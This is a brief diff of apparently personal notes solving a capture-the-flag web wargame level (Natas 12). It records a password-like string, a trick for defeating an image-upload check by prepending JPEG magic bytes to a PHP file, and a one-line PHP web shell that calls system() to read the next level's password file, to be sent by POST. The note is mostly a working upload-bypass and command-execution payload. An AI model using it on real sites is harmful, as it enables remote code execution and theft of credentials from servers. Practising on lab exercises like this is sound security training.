@@ -1,0 +1,5 @@
+jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
+[php files will still run with garbage outside the php tags, so its sufficient to add the first few bytes of JPG before the php]
+[save php in file, hexedit, add FF D8 FF E0 to the front]
+ÿØÿà<?php echo system("cat /etc/natas_webpass/natas13"); ?>
+[send content via POST, similar to previous task]
